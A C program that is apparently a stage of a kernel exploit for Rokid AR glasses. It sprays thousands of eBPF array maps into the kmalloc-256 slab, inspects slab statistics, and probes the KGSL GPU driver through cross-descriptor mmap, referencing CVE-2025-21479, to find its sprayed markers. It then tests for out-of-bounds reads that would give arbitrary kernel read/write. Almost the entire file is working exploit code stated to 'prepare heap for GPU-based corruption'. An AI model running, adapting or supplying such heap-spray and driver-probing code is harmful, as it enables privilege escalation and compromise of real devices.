/*
 * ebpf_map_spray_verify.c - eBPF Map Spray & Physical Layout Verification
 *
 * Purpose:
 * 1. Spray eBPF Array Maps into kmalloc-256 slab
 * 2. Verify memory layout using /proc/slabinfo (if accessible)
 * 3. Attempt to detect physical memory patterns via KGSL Cross-FD
 * 4. Measure spray density and collision probability
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/bpf.h>

/* KGSL definitions for Cross-FD verification */
struct kgsl_gpuobj_alloc
{
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapaddr;
    uint64_t id;
    uint64_t metadata_len;
    uint64_t metadata;
};

#define KGSL_IOC_TYPE 0x09
#define IOCTL_KGSL_GPUOBJ_ALLOC \
    _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

/* BPF Map Spray Configuration */
#define SPRAY_COUNT 4096
#define VALUE_SIZE 200 // Target kmalloc-256 slab
#define MAGIC_MARKER 0x0B9F0B9F00000000ULL

/* Statistics */
struct spray_stats
{
    int maps_created;
    int maps_failed;
    uint64_t total_kernel_mem;
    struct timespec start_time;
    struct timespec end_time;
};

/* BPF syscall wrapper */
static inline int bpf(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

/* Spray state */
static int spray_fds[SPRAY_COUNT];
static struct spray_stats stats;

/* ========================================
 * Phase 1: eBPF Map Spray
 * ========================================
 */
int phase1_spray_maps(void)
{
    printf("\n=== Phase 1: eBPF Map Heap Spray ===\n");
    printf("Configuration:\n");
    printf("  Map count:   %d\n", SPRAY_COUNT);
    printf("  Value size:  %d bytes\n", VALUE_SIZE);
    printf("  Target slab: kmalloc-256\n");
    printf("  Magic:       0x%016llx\n\n", (unsigned long long)MAGIC_MARKER);

    memset(&stats, 0, sizeof(stats));
    clock_gettime(CLOCK_MONOTONIC, &stats.start_time);

    /* Create maps */
    printf("[*] Creating BPF maps...\n");

    for (int i = 0; i < SPRAY_COUNT; i++)
    {
        union bpf_attr attr = {
            .map_type = BPF_MAP_TYPE_ARRAY,
            .key_size = sizeof(uint32_t),
            .value_size = VALUE_SIZE,
            .max_entries = 1,
            .map_flags = 0,
        };

        spray_fds[i] = bpf(BPF_MAP_CREATE, &attr, sizeof(attr));

        if (spray_fds[i] < 0)
        {
            if (stats.maps_failed == 0)
            {
                printf("[-] First failure at map %d: %s\n", i, strerror(errno));
            }
            stats.maps_failed++;
            continue;
        }

        stats.maps_created++;

        /* Write marker value */
        uint32_t key = 0;
        uint64_t value[VALUE_SIZE / sizeof(uint64_t)];
        memset(value, 0, sizeof(value));
        value[0] = MAGIC_MARKER | i;      // Unique marker per map
        value[1] = (uint64_t)i;           // Index for verification
        value[2] = 0xDEADBEEFCAFEBABEULL; // Secondary marker

        union bpf_attr update = {
            .map_fd = spray_fds[i],
            .key = (uint64_t)&key,
            .value = (uint64_t)value,
            .flags = BPF_ANY,
        };

        if (bpf(BPF_MAP_UPDATE_ELEM, &update, sizeof(update)) < 0)
        {
            printf("[!] Failed to update map %d: %s\n", i, strerror(errno));
        }

        /* Progress */
        if ((i + 1) % 1000 == 0)
        {
            printf("  Created %d/%d maps...\n", i + 1, SPRAY_COUNT);
        }
    }

    clock_gettime(CLOCK_MONOTONIC, &stats.end_time);

    /* Calculate stats */
    double elapsed = (stats.end_time.tv_sec - stats.start_time.tv_sec) +
                     (stats.end_time.tv_nsec - stats.start_time.tv_nsec) / 1e9;

    /* Estimate kernel memory usage:
     * struct bpf_array: ~256 bytes (header)
     * + value storage: VALUE_SIZE
     * = ~456 bytes per map, rounded to kmalloc-512 or staying in 256
     */
    stats.total_kernel_mem = stats.maps_created * (256 + VALUE_SIZE);

    printf("\n[+] Spray Complete!\n");
    printf("  Maps created: %d / %d\n", stats.maps_created, SPRAY_COUNT);
    printf("  Maps failed:  %d\n", stats.maps_failed);
    printf("  Time elapsed: %.2f seconds\n", elapsed);
    printf("  Rate:         %.0f maps/sec\n", stats.maps_created / elapsed);
    printf("  Est. kernel memory: %llu KB\n",
           (unsigned long long)(stats.total_kernel_mem / 1024));

    return stats.maps_created;
}

/* ========================================
 * Phase 2: Verify via /proc/slabinfo
 * ========================================
 */
void phase2_check_slabinfo(void)
{
    printf("\n=== Phase 2: Slab Allocator Analysis ===\n");

    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f)
    {
        printf("[-] Cannot open /proc/slabinfo: %s\n", strerror(errno));
        printf("    (Expected on non-root shell)\n");
        return;
    }

    char line[512];
    int found_256 = 0;
    int found_512 = 0;

    printf("[*] Searching for relevant slabs...\n\n");
    printf("%-20s %10s %10s %10s %10s\n",
           "Name", "Active", "Total", "ObjSize", "ObjsPerSlab");
    printf("%-20s %10s %10s %10s %10s\n",
           "----", "------", "-----", "-------", "-----------");

    while (fgets(line, sizeof(line), f))
    {
        if (strstr(line, "kmalloc-256") || strstr(line, "kmalloc-512") ||
            strstr(line, "bpf_array") || strstr(line, "bpf_map"))
        {

            char name[64];
            unsigned long active, total, objsize, objsperslab;

            if (sscanf(line, "%63s %lu %lu %lu %*d %lu",
                       name, &active, &total, &objsize, &objsperslab) >= 5)
            {
                printf("%-20s %10lu %10lu %10lu %10lu\n",
                       name, active, total, objsize, objsperslab);

                if (strstr(name, "kmalloc-256"))
                    found_256 = 1;
                if (strstr(name, "kmalloc-512"))
                    found_512 = 1;
            }
        }
    }

    fclose(f);

    if (!found_256 && !found_512)
    {
        printf("\n[!] Could not find target slabs in output\n");
    }
}

/* ========================================
 * Phase 3: KGSL Cross-FD Physical Scan
 * ========================================
 */
void phase3_kgsl_crossfd_scan(void)
{
    printf("\n=== Phase 3: KGSL Cross-FD Memory Scan ===\n");

    int kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Cannot open KGSL: %s\n", strerror(errno));
        return;
    }

    /* Allocate a large GPU buffer */
    struct kgsl_gpuobj_alloc alloc = {
        .size = 4 * 1024 * 1024, // 4MB
        .flags = 0x00100000,
    };

    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) < 0)
    {
        printf("[-] GPU alloc failed: %s\n", strerror(errno));
        close(kgsl_fd);
        return;
    }

    printf("[+] Allocated 4MB GPU buffer at GPU VA 0x%llx\n",
           (unsigned long long)alloc.mmapaddr);

    /* Map the buffer */
    void *gpu_mem = mmap(NULL, 4 * 1024 * 1024, PROT_READ | PROT_WRITE,
                         MAP_SHARED, kgsl_fd, alloc.mmapaddr);
    if (gpu_mem == MAP_FAILED)
    {
        printf("[-] mmap failed: %s\n", strerror(errno));
        close(kgsl_fd);
        return;
    }

    printf("[+] Mapped to userspace: %p\n", gpu_mem);

    /* Open second FD for Cross-FD access */
    int kgsl_fd2 = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd2 < 0)
    {
        printf("[-] Cannot open second KGSL fd\n");
        munmap(gpu_mem, 4 * 1024 * 1024);
        close(kgsl_fd);
        return;
    }

    /* Try Cross-FD mmap at various offsets (CVE-2025-21479) */
    printf("\n[*] Attempting Cross-FD memory scan...\n");
    printf("    Looking for BPF markers (0x0B9F0B9F)...\n\n");

    int markers_found = 0;

    for (uint64_t offset = 0x1000; offset < 0x100000; offset += 0x1000)
    {
        void *cross_mem = mmap(NULL, 0x1000, PROT_READ,
                               MAP_SHARED, kgsl_fd2, offset);

        if (cross_mem == MAP_FAILED)
        {
            continue;
        }

        /* Scan for our markers */
        uint64_t *ptr = (uint64_t *)cross_mem;
        for (int i = 0; i < 512; i++)
        {
            if ((ptr[i] & 0xFFFFFFFF00000000ULL) == MAGIC_MARKER)
            {
                printf("[!] FOUND MARKER at offset 0x%llx + 0x%x: 0x%016llx\n",
                       (unsigned long long)offset, i * 8,
                       (unsigned long long)ptr[i]);
                markers_found++;
            }

            if (ptr[i] == 0xDEADBEEFCAFEBABEULL)
            {
                printf("[!] FOUND SECONDARY MARKER at offset 0x%llx + 0x%x\n",
                       (unsigned long long)offset, i * 8);
            }
        }

        munmap(cross_mem, 0x1000);
    }

    printf("\n[*] Cross-FD scan complete\n");
    printf("    Markers found: %d\n", markers_found);

    if (markers_found == 0)
    {
        printf("    Note: GPU memory is isolated from kernel slab.\n");
        printf("    Direct collision unlikely without SMMU bypass.\n");
    }

    munmap(gpu_mem, 4 * 1024 * 1024);
    close(kgsl_fd2);
    close(kgsl_fd);
}

/* ========================================
 * Phase 4: Map Integrity Verification
 * ========================================
 */
void phase4_verify_maps(void)
{
    printf("\n=== Phase 4: Map Integrity Verification ===\n");

    int verified = 0;
    int corrupted = 0;
    int oob_success = 0;

    for (int i = 0; i < SPRAY_COUNT; i++)
    {
        if (spray_fds[i] < 0)
            continue;

        /* Read back value */
        uint32_t key = 0;
        uint64_t value[VALUE_SIZE / sizeof(uint64_t)];

        union bpf_attr lookup = {
            .map_fd = spray_fds[i],
            .key = (uint64_t)&key,
            .value = (uint64_t)value,
        };

        if (bpf(BPF_MAP_LOOKUP_ELEM, &lookup, sizeof(lookup)) == 0)
        {
            uint64_t expected = MAGIC_MARKER | i;
            if (value[0] == expected)
            {
                verified++;
            }
            else
            {
                corrupted++;
                printf("[!] Map %d corrupted: expected 0x%016llx got 0x%016llx\n",
                       i, (unsigned long long)expected, (unsigned long long)value[0]);
            }
        }

        /* Try OOB read (check if max_entries was corrupted) */
        key = 100; // Out of bounds for max_entries=1
        if (bpf(BPF_MAP_LOOKUP_ELEM, &lookup, sizeof(lookup)) == 0)
        {
            oob_success++;
            printf("[!] OOB READ SUCCESS on map %d! Exploitation possible!\n", i);
        }
    }

    printf("\n[*] Verification Results:\n");
    printf("    Maps verified: %d\n", verified);
    printf("    Maps corrupted: %d\n", corrupted);
    printf("    OOB success: %d\n", oob_success);

    if (oob_success > 0)
    {
        printf("\n[+] EXPLOITATION OPPORTUNITY DETECTED!\n");
        printf("    Use corrupted map for arbitrary kernel R/W\n");
    }
}

/* ========================================
 * Phase 5: Cleanup
 * ========================================
 */
void phase5_cleanup(void)
{
    printf("\n=== Phase 5: Cleanup ===\n");

    int closed = 0;
    for (int i = 0; i < SPRAY_COUNT; i++)
    {
        if (spray_fds[i] >= 0)
        {
            close(spray_fds[i]);
            closed++;
        }
    }

    printf("[+] Closed %d map file descriptors\n", closed);
}

/* ========================================
 * Main
 * ========================================
 */
int main(int argc, char **argv)
{
    printf("=== eBPF Map Spray & Layout Verification ===\n");
    printf("Target: Rokid AR Glasses (Kernel 5.10.209)\n");
    printf("Goal: Prepare heap for GPU-based corruption\n\n");

    /* Check BPF availability */
    union bpf_attr probe = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = 4,
        .max_entries = 1,
    };
    int probe_fd = bpf(BPF_MAP_CREATE, &probe, sizeof(probe));
    if (probe_fd < 0)
    {
        printf("[-] BPF not available: %s\n", strerror(errno));
        printf("    Check: cat /proc/sys/kernel/unprivileged_bpf_disabled\n");
        return 1;
    }
    close(probe_fd);
    printf("[+] BPF available for unprivileged users\n");

    /* Run phases */
    int maps = phase1_spray_maps();
    if (maps == 0)
    {
        printf("[-] No maps created, aborting\n");
        return 1;
    }

    phase2_check_slabinfo();
    phase3_kgsl_crossfd_scan();
    phase4_verify_maps();

    /* Option to keep maps alive for GPU fuzzing */
    if (argc > 1 && strcmp(argv[1], "-k") == 0)
    {
        printf("\n[*] Keeping maps alive (-k flag). Press Enter to cleanup...\n");
        getchar();
    }

    phase5_cleanup();

    printf("\n=== Done ===\n");
    return 0;
}
